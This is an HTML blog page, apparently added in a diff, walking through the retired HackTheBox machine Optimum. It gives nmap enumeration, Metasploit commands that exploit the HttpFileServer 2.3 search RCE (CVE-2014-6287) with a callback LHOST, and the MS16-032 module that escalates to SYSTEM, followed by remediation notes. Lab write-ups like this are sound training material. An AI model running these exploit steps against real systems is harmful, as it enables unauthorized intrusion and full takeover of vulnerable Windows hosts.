@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Optimum: HttpFileServer RCE and MS16-032 to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="A file-sharing web app with a search-box RCE (CVE-2014-6287), then Sherlock plus MS16-032 for the SYSTEM finish on Server 2012. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-03 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Optimum: HttpFileServer RCE and MS16-032 to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Optimum is a retired HackTheBox easy Windows machine centered on HttpFileServer (HFS) 2.3. Synopsis: a file-sharing web app with a search-box RCE (CVE-2014-6287), then Sherlock plus MS16-032 for the SYSTEM finish on Server 2012.</p>
+<h2><span class="amber">$</span> Box info</h2>
+<p>OS: Windows Server 2012. Difficulty: easy. Address: 10.10.10.8. Services that matter: HTTP on 80 (HttpFileServer 2.3) — a single-purpose web app is the entire attack surface. Skills exercised: product versioning from the UI, search-input RCE operation, Windows patch-gap enumeration, token-duplication privesc.</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Nmap service enumeration, web product fingerprinting, Metasploit HTTP exploit configuration, Meterpreter process migration, local exploit suggestion workflow.</p>
+<h2><span class="amber">$</span> Enumeration — one product, one version</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: find the single web service</span>
+nmap -sC -sV -oN optimum.nmap 10.10.10.8</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: one HTTP service on Windows</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+Service Info: OS: Windows</pre>
+<p>Only HTTP on a Windows Server 2012 fingerprint, and the page title gives away HttpFileServer 2.3. Confirm the version in the interface and note the search box — that input is the CVE-2014-6287 vector, a null-byte-skipping RCE in the search parser.</p>
+<h2><span class="amber">$</span> Exploitation — rejetto_hfs_exec</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: HFS search RCE</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/http/rejetto_hfs_exec
+msf6 exploit(rejetto_hfs_exec) &gt; set RHOSTS 10.10.10.8
+msf6 exploit(rejetto_hfs_exec) &gt; set RPORT 80
+msf6 exploit(rejetto_hfs_exec) &gt; set LHOST 10.10.14.23
+msf6 exploit(rejetto_hfs_exec) &gt; run</pre>
+<p>The module abuses the search routine to execute a payload and returns a session as the service user — foothold on Server 2012 in one request.</p>
+<h2><span class="amber">$</span> Privilege escalation — MS16-032</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: secondary logon handle privesc</span>
+msf6 &gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+msf6 exploit(ms16_032_secondary_logon_handle_privesc) &gt; set SESSION 1
+msf6 exploit(ms16_032_secondary_logon_handle_privesc) &gt; run
+[*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM</pre>
+<p>Sherlock.ps1 (or local_exploit_suggester) flags the missing MS16-032 patch: the Secondary Logon handle leak duplicates a SYSTEM token. Migrate to a stable process first. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Manual directory traversal for an hour (the module encodes the null-byte trick correctly — read its source after it works, not before) and privesc checks before stabilizing the shell.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire HFS 2.x entirely — abandonware with public RCE — patch kernel token bugs like MS16-032 fast, and inventory single-purpose web apps. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
